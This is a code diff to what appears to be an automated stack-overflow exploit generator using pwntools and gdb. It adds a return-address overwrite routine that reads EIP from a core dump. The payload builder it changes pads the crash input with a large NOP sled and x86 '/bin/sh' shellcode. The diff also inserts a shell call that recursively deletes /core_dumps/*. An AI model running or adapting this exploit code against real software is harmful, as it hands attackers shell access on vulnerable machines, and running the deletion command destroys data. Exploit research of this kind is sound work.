@@ -2,6 +2,7 @@ from pwn import *
 from utils import cleanup, build_command
 from exploit_utils import ENV_VARS
 import argparse
+import glob
 
 def generate_testcase(len):
     return cyclic(len)
@@ -110,21 +111,10 @@ def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace):
 
     output, _ = gdb_proc.communicate()
 
-    eip_value = None
-    for line in output.splitlines():
-        if "eip" in line:  # Find the line with 'eip'
-            eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
-            break
-    
-    if eip_value.startswith("0x"):  #remove 0x prefix
-        eip_value = eip_value[2:]
-
-        
-    eip_bytes = bytes.fromhex(eip_value)    #convert to hex bytes
-    eip_bytes = eip_bytes[::-1]             #convert to little endian
+    eip = extract_eip(output)
 
     #if the value of the eip belongs to the crash input, it means it was overwritten by the crash input and the payload reached the return address
-    if eip_bytes in crash_input:    
+    if eip in crash_input:    
         return True
 
     #eip still has a valid value, so it wasn't overwritten by the payload. The program crashed earlier and it did not reach the return address
@@ -133,6 +123,15 @@ def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace):
 
 def crash_explorer():
     payload_mutation = []
+
+    subprocess.Popen(
+        "rm -r /core_dumps/*", 
+        stdin=subprocess.PIPE, 
+        stdout=subprocess.PIPE, 
+        stderr=subprocess.PIPE,
+        shell=True
+    )
+
     return payload_mutation
 
 def payload_builder(crash_input: bytes, target_bin: str):
@@ -140,17 +139,64 @@ def payload_builder(crash_input: bytes, target_bin: str):
     target_address = stack_middle_address(target_ra(target_bin))
     shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
 
-    payload = crash_input
-
-    payload += struct.pack("<I", target_address)
+    payload = overwrite_ra(crash_input, target_bin, struct.pack("<I", target_address))
     payload += b'\x90' * 129000
     payload += shellcode
 
     open("payload", "wb").write(payload)
 
 
-
     return
+
+def overwrite_ra(crash_input: bytes, target_bin: str, target_ra: bytes):
+
+    core_files = glob.glob(f'/core_dumps/core.{target_bin}.*')
+    core_path = core_files[-1]
+
+    gdb_proc = subprocess.Popen(
+        [f"gdb -q {target_bin} {core_path}"], 
+        stdin=subprocess.PIPE, 
+        stdout=subprocess.PIPE, 
+        stderr=subprocess.PIPE, 
+        shell=True, 
+        text=True
+    )
+
+    gdb_proc.stdin.write("info registers\n")
+    gdb_proc.stdin.flush()
+
+    gdb_proc.stdin.write("q\n")
+    gdb_proc.stdin.write("y\n")
+    gdb_proc.stdin.flush()
+
+    output, _ = gdb_proc.communicate()
+
+    eip = extract_eip(output)
+
+    if eip not in crash_input:
+        logging.error('Houston we have a problem')
+    
+    payload = crash_input.replace(eip, target_ra)
+
+    return payload
+
+def extract_eip(core_output: str):
+
+    eip_value = None
+    for line in core_output.splitlines():
+        if "eip" in line:  # Find the line with 'eip'
+            eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
+            break
+
+    # print(f'eip value type: {type(eip_value)}')
+
+    
+    if eip_value.startswith("0x"):  #remove 0x prefix
+        eip_value = eip_value[2:]
+
+    eip_bytes = bytes.fromhex(eip_value)    #convert to hex bytes
+    eip_bytes = eip_bytes[::-1] 
+    return eip_bytes
 
 def locate_ra(pattern, target):
 
